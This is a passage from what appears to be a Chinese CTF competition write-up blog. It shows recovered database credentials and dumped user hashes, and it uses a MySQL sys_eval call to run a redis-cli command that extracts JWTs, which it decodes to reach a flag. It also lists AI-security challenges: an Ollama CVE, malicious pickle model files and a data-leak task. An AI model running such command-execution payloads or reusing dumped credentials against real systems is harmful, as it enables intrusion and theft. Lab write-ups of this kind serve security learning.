        window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">const</span> form <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>form<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                form<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">encryptPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>商家登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span>用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span>密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到mysql数据库账密<code>root:roottoor@cimer2025</code><br>redis数据库密码<code>root@root!cimer</code></p>
<p>查users库</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>password<span class="token punctuation">`</span></span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>inf<span class="token punctuation">`</span></span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>is_admin<span class="token punctuation">`</span></span><span class="token punctuation">)</span> <span class="token keyword">VALUES</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>	<span class="token string">'chenxin'</span><span class="token punctuation">,</span>	<span class="token string">'A47CDC5B7829175B88D87C6F64A9DE6FCD0F7683FD25B231D770F28CEAAB3B92'</span><span class="token punctuation">,</span>	<span class="token string">'成交量: 326次, 交易额: 23800元, 推流: 192次, 浏览: 7320次'</span><span class="token punctuation">,</span>	<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>	<span class="token string">'wuwen'</span><span class="token punctuation">,</span>	<span class="token string">'46E99CDCA9EC4EBB1740A088B2AF3924A50CF3CFC943544F'</span><span class="token punctuation">,</span>	<span class="token string">'成交量: 158次, 交易额: 42900元, 推流: 76次, 浏览: 5840次'</span><span class="token punctuation">,</span>	<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>	<span class="token string">'wanghua'</span><span class="token punctuation">,</span>	<span class="token string">'455423198CBA49DE546C1368AC7880728BE72A3825CDCC92ADA9BB8029DADA67'</span><span class="token punctuation">,</span>	<span class="token string">'成交量: 745次, 交易额: 15700元, 推流: 245次, 浏览: 8930次'</span><span class="token punctuation">,</span>	<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>	<span class="token string">'jinguizhi'</span><span class="token punctuation">,</span>	<span class="token string">'EC943EBE2AA04024EC55BAEAB382673160EFBA0BAFB4A19E1A588164FD404001'</span><span class="token punctuation">,</span>	<span class="token string">'成交量: 482次, 交易额: 36800元, 推流: 163次, 浏览: 4320次'</span><span class="token punctuation">,</span>	<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>	<span class="token string">'guoxiaohong'</span><span class="token punctuation">,</span>	<span class="token string">'B4CE7F02EE2A0CE94F0C2160D3CD8D73FF8DD8E3C2D2C11E8F44C616838A0DD1'</span><span class="token punctuation">,</span>	<span class="token string">'成交量: 893次, 交易额: 41200元, 推流: 278次, 浏览: 9650次'</span><span class="token punctuation">,</span>	<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>	<span class="token string">'huangzhiqiang'</span><span class="token punctuation">,</span>	<span class="token string">'5FE0DE44C3BE01588C7E39B2162852204C8168FF766674650DF3B303251B3C7D9A8AD3B177765506'</span><span class="token punctuation">,</span>	<span class="token string">'成交量: 234次, 交易额: 28700元, 推流: 94次, 浏览: 3290次'</span><span class="token punctuation">,</span>	<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>	<span class="token string">'zhangzehua'</span><span class="token punctuation">,</span>	<span class="token string">'C412816124FADCADDD129E1A497EF7BA00D2F6A8FAD969F2D770F28CEAAB3B92696A1D2DEB1F07A9'</span><span class="token punctuation">,</span>	<span class="token string">'成交量: 671次, 交易额: 45300元, 推流: 201次, 浏览: 7580次'</span><span class="token punctuation">,</span>	<span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>	<span class="token string">'zhangxiuyun'</span><span class="token punctuation">,</span>	<span class="token string">'DE66703718E5B876C412816124FADCAD83325BEE0035E4EB66D7EE49889FDA58'</span><span class="token punctuation">,</span>	<span class="token string">'成交量: 409次, 交易额: 19600元, 推流: 132次, 浏览: 6210次'</span><span class="token punctuation">,</span>	<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>	<span class="token string">'wangming'</span><span class="token punctuation">,</span>	<span class="token string">'A247BCD055B3AAB8EF93194C49755EEEF8393636FA0EB3A0'</span><span class="token punctuation">,</span>	<span class="token string">'成交量: 567次, 交易额: 37400元, 推流: 287次, 浏览: 8340次'</span><span class="token punctuation">,</span>	<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'wangyan'</span><span class="token punctuation">,</span>	<span class="token string">'7F7455AEB8A3D5F3CAFB30434AF3DC03BC3293D7F1B0CD52'</span><span class="token punctuation">,</span>	<span class="token string">'成交量: 295次, 交易额: 42800元, 推流: 115次, 浏览: 4970次'</span><span class="token punctuation">,</span>	<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查redis</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'echo "AUTH root@root!cimer\nKEYS *" | redis-cli -h localhost -p 6379'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到jwt</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJuaW5neGl1cm9uZyIsInB3ZCI6IkM0MzIwMjQwQ0Y0OTMwNkI2RkY4NjA3Qzk2ODBCRUIxMzMzNkM2QzFDNjMxRUIxMTQ1MEQzNjQyQjhBM0M5NTMiLCJpYXQiOjE3NDMyOTk5NjR9<span class="token punctuation">.</span>l112ZTii6Ru7FvAEoS8XsUGrN<span class="token operator">-</span>R5M8QpKpu48hTaH<span class="token operator">-</span><span class="token number">4</span>
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJndW94aWFvaG9uZyIsInB3ZCI6IkI0Q0U3RjAyRUUyQTBDRTk0RjBDMjE2MEQzQ0Q4RDczRkY4REQ4RTNDMkQyQzExRThGNDRDNjE2ODM4QTBERDEiLCJpYXQiOjE3NDMyOTk5NjR9<span class="token punctuation">.</span>dOepLP5taYHRq7ZsNeUDp5cTJqUPGFtmsDgPLpm8KN0
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJnYW50aW5ndGluZyIsInB3ZCI6IkM3NEM0QTQ0RERDQTIzNkFFMjYyOUZDMTlGNTc1MzgwQjAwMzU2MDM3QzQ3NTI4MjNGRDA5NENBM0Y4RUYzREYiLCJpYXQiOjE3NDMyOTk5NjR9<span class="token punctuation">.</span>zLWkcPsjJLten17T6ldMB_rIDCxIV5hvWIPT6JJyAb0
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJ3YW5nZ3VpemhpIiwicHdkIjoiNDZFOTlDRENBOUVDNEVCQjBCODk0OTRCQTcwNEU4RjM0NTU0MjMxOThDQkE0OURFMEFDNTA0MDY3MDM1MDMzNEMwNDY1N0VCMzBGMEMzRDYiLCJpYXQiOjE3NDMyOTk5NjR9<span class="token punctuation">.</span>SxCXfYtOc<span class="token operator">-</span>IV4XQxSX5wN0tm0FueM7v<span class="token operator">-</span><span class="token number">9</span>lLHtQcd3bc
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJtZW5ncGVuZyIsInB3ZCI6IjU1QkMwMDUwNTI1MjlBOEIwMTc2NzI1M0IwMzkxNTE3NzlBOUZDOEQ1MTRCRjFDNzk0QTFCQ0Q2QjIwMDI1MkQyNjJCOEY3NEE2MjE5M0M5IiwiaWF0IjoxNzQzMjk5OTY0fQ<span class="token punctuation">.</span>Dpg8rVrj0iAqalojRxPpdzZQeMVa5rpWwjIBmvBAU4c
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJ6aGFuZ3plaHVhIiwicHdkIjoiQzQxMjgxNjEyNEZBRENBREREMTI5RTFBNDk3RUY3QkEwMEQyRjZBOEZBRDk2OUYyRDc3MEYyOENFQUFCM0I5MjY5NkExRDJERUIxRjA3QTkiLCJpYXQiOjE3NDMyOTk5NjR9<span class="token punctuation">.</span>K_lkgKZ3FEp7VC1ITw8SXykVc<span class="token operator">-</span>Qd36Af_vJEa<span class="token operator">-</span>IYKAE
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJ6aGFuZ2xpaHVhIiwicHdkIjoiNzU2MkExNTZGREM3QUY5OEM0MTI4MTYxMjRGQURDQURDMDZFRENFRDZDRjY5REUzNzg3NzYyNEFDMjFFQzE3OCIsImlhdCI6MTc0MzI5OTk2NH0<span class="token punctuation">.</span>SYl4OpnMD5LQnIdMFnjUUyW0QYOsJbt2usOhVlpoEU8
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJ3YW5naHVhIiwicHdkIjoiNDU1NDIzMTk4Q0JBNDlERTU0NkMxMzY4QUM3ODgwNzI4QkU3MkEzODI1Q0RDQzkyQURBOUJCODAyOURBREE2NyIsImlhdCI6MTc0MzI5OTk2NH0<span class="token punctuation">.</span>P4k8FRXvjsUo0dnXQ1ONN9r1FIKgTKvTWF7GVnpsaBE
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJjaGVueGluIiwicHdkIjoiQTQ3Q0RDNUI3ODI5MTc1Qjg4RDg3QzZGNjRBOURFNkZDRDBGNzY4M0ZEMjVCMjMxRDc3MEYyOENFQUFCM0I5MiIsImlhdCI6MTc0MzI5OTk2NH0<span class="token punctuation">.</span>d54549DANdaGFVEc12rch0AqO1qQoeMgP5jj93QfsOc
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJ3dXdlbiIsInB3ZCI6IjQ2RTk5Q0RDQTlFQzRFQkIxNzQwQTA4OEIyQUYzOTI0QTUwQ0YzQ0ZDOTQzNTQ0RiIsImlhdCI6MTc0MzI5OTk2NH0<span class="token punctuation">.</span>xZ5lWpI6MO4O2RhjdfsfLgh9yKDM6DTv9oJK_0ptCls
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJ6aGFuZ3hpdXl1biIsInB3ZCI6IkRFNjY3MDM3MThFNUI4NzZDNDEyODE2MTI0RkFEQ0FEODMzMjVCRUUwMDM1RTRFQjY2RDdFRTQ5ODg5RkRBNTgiLCJpYXQiOjE3NDMyOTk5NjR9<span class="token punctuation">.</span>bLvnDOkGFw3DvWlvwug<span class="token operator">-</span>h8ok7AxbOFtYk<span class="token operator">-</span>WWPewN0SM
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJ3YW5neWFuIiwicHdkIjoiN0Y3NDU1QUVCOEEzRDVGM0NBRkIzMDQzNEFGM0RDMDNCQzMyOTNEN0YxQjBDRDUyIiwiaWF0IjoxNzQzMjk5OTY0fQ<span class="token punctuation">.</span>H3nbOVLdcvq3i7MfJLmBvmPem5ryk6Kdj7JkwGTeC3Q
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJ3YW5nbWluZyIsInB3ZCI6IkEyNDdCQ0QwNTVCM0FBQjhFRjkzMTk0QzQ5NzU1RUVFRjgzOTM2MzZGQTBFQjNBMCIsImlhdCI6MTc0MzI5OTk2NH0<span class="token punctuation">.</span>hmw1s4c3F9ZDu7b6NJ647R_JhkgGTIdVjL1NGepcJgQ
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJqaW5ndWl6aGkiLCJwd2QiOiJFQzk0M0VCRTJBQTA0MDI0RUM1NUJBRUFCMzgyNjczMTYwRUZCQTBCQUZCNEExOUUxQTU4ODE2NEZENDA0MDAxIiwiaWF0IjoxNzQzMjk5OTY0fQ<span class="token punctuation">.</span><span class="token number">6</span>I4NTNRahMyOAAhTk<span class="token operator">-</span>aSnAP7yuAxCeb8Zll2AMYnkXI
jwt:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJzdWIiOiJodWFuZ3poaXFpYW5nIiwicHdkIjoiNUZFMERFNDRDM0JFMDE1ODhDN0UzOUIyMTYyODUyMjA0QzgxNjhGRjc2NjY3NDY1MERGM0IzMDMyNTFCM0M3RDlBOEFEM0IxNzc3NjU1MDYiLCJpYXQiOjE3NDMyOTk5NjR9<span class="token punctuation">.</span>FnnmCXNe8pdkL3UT9dmVjmlQ_LqwgJ4nwqvsESk9lFM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>解码得到</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">ningxiurong
guoxiaohong
gantingting
wangguizhi
mengpeng
zhangzehua
zhanglihua
wanghua
chenxin
wuwen
zhangxiuyun
wangyan
wangming
jingguizhi
huangzhiqiang<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对照一下得到</p>
<p><code>wangguizhi_ningxiurong_zhanglihua_mengpeng_gantingting</code></p>
<p>md5 交上去 <code>8429e825242b4e9063862b78da1e46dd</code></p>
<hr>
<h1 id="模型环境安全"><a href="#模型环境安全" class="headerlink" title="模型环境安全"></a>模型环境安全</h1><p><a target="_blank" rel="noopener" href="http://192.168.67.155:11434/">http://192.168.67.155:11434</a></p>
<h2 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h2><blockquote>
<p>管理员为了方便利用AI进行办公，在服务器中搭建了一个Ollama框架，但后续发现此框架存在安全问题。请选手对Ollama框架进行安全测试，并获取服务器中的uid为1000的用户名，作为标准答案提交。</p>
</blockquote>
<p>访问 &#x2F;api&#x2F;version，版本为 0.1.33</p>
<p>感觉是去年DAS十月赛的CVE，但是没记细节，寄</p>
<h2 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h2><blockquote>
<p>为满足工作需求，管理员在网络上下载了一批训练模型的pkl和h5文件想要进行使用。在未进行安全审计前，管理员将文件命名为””AI_models.zip””放到了文件服务器中。经过分析发现，文件中包含了恶意连接操作的文件。请选手分析出存在恶意连接操作的模型文件，并将恶意连接的主机ip和端口，作为标准答案提交。</p>
</blockquote>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><blockquote>
<p>根据公司内部的规定，在使用AI时，员工必须严格遵守不上传涉及公司敏感信息的要求。这些敏感信息可能包括但不限于：用户的个人资料、财务报表、员工的个人信息、研发中的技术⽅案、内部通讯记录、合同文件、商业机密、市场营销策略等任何可能对公司造成不利影响的机密数据。管理员在服务器当中搭建了本地AI模型来帮助其办公，但在某次操作时违反了公司规定，管理员想要利用AI批量对包含了用户隐私信息的图片进行批量格式转换。请选手访问文件服务器。获取””upload.zip””文件，分析附件还原上传的数据、统计用户的隐私数据数量，将隐私数据数量，作为标准答案提交。</p>
</blockquote>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2026 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>